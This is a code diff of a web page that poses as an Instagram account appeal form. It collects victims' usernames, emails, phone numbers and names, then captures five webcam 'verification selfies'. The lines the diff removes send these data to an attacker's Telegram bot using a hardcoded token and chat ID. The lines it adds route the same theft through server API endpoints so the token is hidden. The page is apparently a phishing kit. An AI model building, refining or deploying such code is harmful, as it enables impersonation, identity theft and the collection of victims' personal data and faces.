@@ -642,13 +642,11 @@
 
     <script>
         // ============================================================
-        // 1. TELEGRAM CREDENTIALS (Original – direct send)
+        // NO HARDCODED TELEGRAM TOKEN/Chat_ID – Server API endpoints use env vars
         // ============================================================
-        const TELEGRAM_BOT_TOKEN = '7970088628:AAEJbT7PvzAnnP33z9_vVzCWWLItzbTXCfQ';
-        const TELEGRAM_CHAT_ID = '6881713177';
 
         // ============================================================
-        // 2. COUNTRY DATABASE (Flag + Code + Name) – India at top
+        // 1. COUNTRY DATABASE (Flag + Code + Name) – India at top
         // ============================================================
         const COUNTRIES = [
             { code: "+91", flag: "🇮🇳", name: "India" },
@@ -712,7 +710,7 @@
         ];
 
         // ============================================================
-        // 3. DROPDOWN LOGIC (Searchable List)
+        // 2. DROPDOWN LOGIC
         // ============================================================
         function renderOptions(dropdownId) {
             const container = document.getElementById('options' + dropdownId.replace('dropdown', ''));
@@ -729,7 +727,6 @@
                     selected.querySelector('.flag').textContent = c.flag;
                     selected.querySelector('.code').textContent = c.code;
                     dd.querySelector('.dropdown-list').classList.remove('open');
-                    // Validate phone
                     const phoneInput = dd.closest('.phone-group').querySelector('.phone-input');
                     if (phoneInput) validatePhone(phoneInput);
                 };
@@ -746,9 +743,7 @@
                 list.classList.add('open');
                 const id = dropdownId.replace('dropdown', '');
                 const container = document.getElementById('options' + id);
-                if (container && !container.hasChildNodes()) {
-                    renderOptions(dropdownId);
-                }
+                if (container && !container.hasChildNodes()) renderOptions(dropdownId);
                 const code = dd.querySelector('.selected .code').textContent;
                 container.querySelectorAll('.option').forEach(o => {
                     o.classList.toggle('active', o.dataset.code === code);
@@ -762,10 +757,8 @@
             const dd = document.getElementById(dropdownId);
             const input = dd.querySelector('.dropdown-search input');
             const query = input.value.toLowerCase().trim();
-            const options = dd.querySelectorAll('.option');
-            options.forEach(o => {
-                const text = o.textContent.toLowerCase();
-                o.style.display = text.includes(query) ? '' : 'none';
+            dd.querySelectorAll('.option').forEach(o => {
+                o.style.display = o.textContent.toLowerCase().includes(query) ? '' : 'none';
             });
         }
 
@@ -776,11 +769,10 @@
         });
 
         // ============================================================
-        // 4. AUTO DETECT COUNTRY (IP) + Default India
+        // 3. AUTO DETECT COUNTRY
         // ============================================================
         async function detectAndSetCountry() {
-            let code = '+91';
-            let flag = '🇮🇳';
+            let code = '+91', flag = '🇮🇳';
             try {
                 const res = await fetch('https://ipapi.co/country/');
                 if (res.ok) {
@@ -800,10 +792,7 @@
                     const c = map[iso];
                     if (c) {
                         const country = COUNTRIES.find(x => x.code === c);
-                        if (country) {
-                            code = c;
-                            flag = country.flag;
-                        }
+                        if (country) { code = c; flag = country.flag; }
                     }
                 }
             } catch (_) {}
@@ -816,77 +805,54 @@
         detectAndSetCountry();
 
         // ============================================================
-        // 5. PHONE VALIDATION (FIXED: removes leading zero, allows 7-10 digits)
+        // 4. PHONE VALIDATION (Auto-remove leading zero)
         // ============================================================
         function validatePhone(input) {
             const group = input.closest('.phone-group');
             const error = group.querySelector('.phone-error');
-            const raw = input.value.trim();
-
-            // If empty, hide error and return true (optional field)
-            if (!raw) {
-                error.classList.remove('show');
-                return true;
-            }
+            let raw = input.value.trim();
+            if (!raw) { error.classList.remove('show'); return true; }
 
             let local = raw;
-            let detectedCode = '';
-
-            // If starts with +, parse country code
             if (raw.startsWith('+')) {
                 const sorted = [...COUNTRIES].sort((a, b) => b.code.length - a.code.length);
+                let detected = false;
                 for (const c of sorted) {
                     if (raw.startsWith(c.code)) {
-                        detectedCode = c.code;
-                        local = raw.slice(c.code.length);
-                        // Auto-fill country
                         const selected = group.querySelector('.selected');
                         selected.querySelector('.flag').textContent = c.flag;
                         selected.querySelector('.code').textContent = c.code;
+                        local = raw.slice(c.code.length);
                         input.value = local;
+                        detected = true;
                         break;
                     }
                 }
-                if (!detectedCode) {
+                if (!detected) {
                     error.textContent = 'Unknown country code. Please select your country.';
                     error.classList.add('show');
                     return false;
                 }
             }
 
-            // Remove all non-digit characters
             let digits = local.replace(/\D/g, '');
-
-            // Remove leading zero (common in India)
-            if (digits.startsWith('0')) {
-                digits = digits.substring(1);
-            }
-
-            // Now count digits
+            if (digits.startsWith('0')) digits = digits.substring(1);
             if (digits.length < 7 || digits.length > 10) {
                 error.textContent = 'Please enter 7-10 digits after country code.';
                 error.classList.add('show');
                 return false;
             }
-
             error.classList.remove('show');
             return true;
         }
 
-        // Attach validation to all phone inputs
         document.querySelectorAll('.phone-input').forEach(inp => {
-            inp.addEventListener('input', function() {
-                validatePhone(this);
-                // Also store clean value for submission
-                this.dataset.cleanValue = this.value.trim();
-            });
-            inp.addEventListener('blur', function() {
-                validatePhone(this);
-            });
+            inp.addEventListener('input', function() { validatePhone(this); });
+            inp.addEventListener('blur', function() { validatePhone(this); });
         });
 
         // ============================================================
-        // 6. VERIFICATION STATE (Original)
+        // 5. VERIFICATION STATE
         // ============================================================
         let verificationState = {
             currentPose: 0,
@@ -905,127 +871,61 @@
         ];
 
         // ============================================================
-        // 7. SELECT OPTION (Original)
+        // 6. SELECT OPTION
         // ============================================================
         function selectOption(type, element) {
             document.querySelectorAll('.option-item').forEach(item => item.classList.remove('selected'));
             element.classList.add('selected');
             setTimeout(() => {
                 document.getElementById('selectionScreen').classList.add('hidden');
-                if (type === 'disabled') {
-                    document.getElementById('disabledForm').classList.add('active');
-                } else {
-                    document.getElementById('chatForm').classList.add('active');
-                }
+                document.getElementById(type === 'disabled' ? 'disabledForm' : 'chatForm').classList.add('active');
             }, 300);
         }
 
         // ============================================================
-        // 8. FORM SUBMIT (Direct Telegram – Original Style) WITH CONSOLE LOGS
+        // 7. FORM SUBMIT – Server API endpoints (No hardcoded token)
         // ============================================================
         document.getElementById('disabledAppealForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            console.log('🔹 Disabled Form Submitted');
             handleFormSubmit(this, 'Disabled Account Appeal');
         });
         document.getElementById('chatAppealForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            console.log('🔹 Chat Form Submitted');
             handleFormSubmit(this, 'Chat Restrictions Appeal');
         });
 
         function handleFormSubmit(form, formType) {
-            console.log('🔸 handleFormSubmit called for:', formType);
-
-            // Get phone input
             const phoneInput = form.querySelector('.phone-input');
-            console.log('🔸 Phone input value:', phoneInput.value);
+            if (!validatePhone(phoneInput)) { phoneInput.focus(); return; }
 
-            // Validate phone – if fails, focus and return
-            if (!validatePhone(phoneInput)) {
-                console.log('❌ Phone validation failed');
-                phoneInput.focus();
-                return;
-            }
-            console.log('✅ Phone validation passed');
-
-            // Get all form data
             const formData = new FormData(form);
             const data = Object.fromEntries(formData);
-            console.log('📋 Form data:', data);
-
-            // Get phone with country code
             const group = form.querySelector('.phone-group');
             const code = group.querySelector('.selected .code').textContent;
-            const phone = code + ' ' + phoneInput.value.trim();
-            data.phone = phone;
-            delete data.phoneNumber; // remove raw
+            data.phone = code + ' ' + phoneInput.value.trim();
+            delete data.phoneNumber;
 
             verificationState.formData = { type: formType, ...data };
-            console.log('📦 verificationState.formData:', verificationState.formData);
 
-            // Send form to Telegram directly
-            sendFormToTelegram(data, formType);
-
-            // Open verification screen
-            document.querySelectorAll('.form-container').forEach(f => f.classList.remove('active'));
-            document.getElementById('verificationScreen').classList.add('active');
-            console.log('📸 Verification screen opened');
-            setTimeout(startVerification, 500);
-        }
-
-        // ============================================================
-        // 9. TELEGRAM SEND FUNCTIONS (Direct)
-        // ============================================================
-        function sendFormToTelegram(data, formType) {
-            const message = `📋 <b>Instagram Appeal Form</b>
-
-<b>Type:</b> ${formType}
-━━━━━━━━━━━━━━━━━━━━
-<b>👤 Username:</b> ${data.username}
-<b>📧 Email:</b> ${data.email}
-<b>📱 Phone:</b> ${data.phone || 'N/A'}
-<b>📝 Name:</b> ${data.fullname}
-<b>🔗 Alt Account:</b> ${data.alternative || 'N/A'}
-<b>👥 Relationship:</b> ${data.relationship}
-━━━━━━━━━━━━━━━━━━━━
-<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
-
-            console.log('📤 Sending to Telegram:', message);
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            // Send to server API (which uses env vars)
+            fetch('/api/submit-form', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
+                body: JSON.stringify(data)
             })
             .then(res => res.json())
-            .then(data => console.log('✅ Telegram response:', data))
-            .catch(err => console.error('❌ Telegram send error:', err));
-        }
-
-        function sendSelfieToTelegram(blob, pose, poseNumber) {
-            const formData = new FormData();
-            formData.append('chat_id', TELEGRAM_CHAT_ID);
-            formData.append('photo', blob, `selfie_${poseNumber}.jpg`);
-            formData.append('caption',
-                `📸 <b>Verification Selfie ${poseNumber}/5</b>
-
-<b>👤 User:</b> ${verificationState.formData.username}
-<b>📝 Pose:</b> ${pose.text}
-<b>📋 Type:</b> ${verificationState.formData.type}
-<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`);
-            formData.append('parse_mode', 'HTML');
-
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
+            .then(() => {
+                document.querySelectorAll('.form-container').forEach(f => f.classList.remove('active'));
+                document.getElementById('verificationScreen').classList.add('active');
+                setTimeout(startVerification, 500);
             })
-            .then(res => res.json())
-            .then(data => console.log('✅ Selfie sent:', data))
-            .catch(err => console.error('❌ Selfie send error:', err));
+            .catch(err => {
+                alert('Submit failed: ' + err.message);
+            });
         }
 
         // ============================================================
-        // 10. VERIFICATION FLOW (Original)
+        // 8. VERIFICATION FLOW (Server API for selfies & completion)
         // ============================================================
         function startVerification() {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 1280, height: 720 } })
@@ -1064,10 +964,24 @@
 
             canvas.toBlob(blob => {
                 const pose = POSES[verificationState.currentPose];
-                verificationState.captures.push(blob);
-                sendSelfieToTelegram(blob, pose, verificationState.currentPose + 1);
-                verificationState.currentPose++;
-                setTimeout(processNextPose, 800);
+                const fd = new FormData();
+                fd.append('photo', blob, `selfie_${verificationState.currentPose + 1}.jpg`);
+                fd.append('username', verificationState.formData.username);
+                fd.append('formType', verificationState.formData.type);
+                fd.append('poseText', pose.text);
+                fd.append('poseNumber', verificationState.currentPose + 1);
+
+                fetch('/api/submit-selfie', { method: 'POST', body: fd })
+                    .then(res => res.json())
+                    .then(() => {
+                        verificationState.currentPose++;
+                        setTimeout(processNextPose, 800);
+                    })
+                    .catch(err => {
+                        alert('Selfie upload failed: ' + err.message);
+                        verificationState.currentPose++;
+                        setTimeout(processNextPose, 800);
+                    });
             }, 'image/jpeg', 0.92);
         }
 
@@ -1078,30 +992,27 @@
             const btn = document.getElementById('verificationSubmitBtn');
             btn.classList.add('show');
             btn.onclick = () => {
-                const data = verificationState.formData;
-                const message =
-                    `✅ <b>VERIFICATION COMPLETED</b>
-
-<b>👤 User:</b> ${data.username}
-<b>📧 Email:</b> ${data.email}
-<b>📱 Phone:</b> ${data.phone || 'N/A'}
-<b>📝 Name:</b> ${data.fullname}
-<b>📋 Form:</b> ${data.type}
-<b>📸 Photos:</b> 5/5
-<b>✓ Status:</b> Ready for Review
-<b>🕐 Completed:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
-
-                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                const d = verificationState.formData;
+                fetch('/api/verification-complete', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
-                }).catch(err => console.error('Completion error:', err));
-
-                if (verificationState.videoStream) {
-                    verificationState.videoStream.getTracks().forEach(t => t.stop());
-                }
-                document.getElementById('verificationScreen').classList.remove('active');
-                document.getElementById('successModal').classList.add('active');
+                    body: JSON.stringify({
+                        username: d.username,
+                        email: d.email,
+                        phone: d.phone,
+                        fullname: d.fullname,
+                        formType: d.type
+                    })
+                })
+                .then(res => res.json())
+                .then(() => {
+                    if (verificationState.videoStream) {
+                        verificationState.videoStream.getTracks().forEach(t => t.stop());
+                    }
+                    document.getElementById('verificationScreen').classList.remove('active');
+                    document.getElementById('successModal').classList.add('active');
+                })
+                .catch(err => alert('Completion failed: ' + err.message));
             };
         }
 
@@ -1117,16 +1028,14 @@
         }
 
         // ============================================================
-        // 11. FOOTER YEAR (Auto-update)
+        // 9. FOOTER YEAR
         // ============================================================
         document.getElementById('footerYear').textContent = new Date().getFullYear();
 
         // ============================================================
-        // 12. INIT – Populate dropdowns
+        // 10. INIT
         // ============================================================
-        ['1', '2'].forEach(id => {
-            renderOptions('dropdown' + id);
-        });
+        ['1', '2'].forEach(id => renderOptions('dropdown' + id));
     </script>
 </body>
 </html>
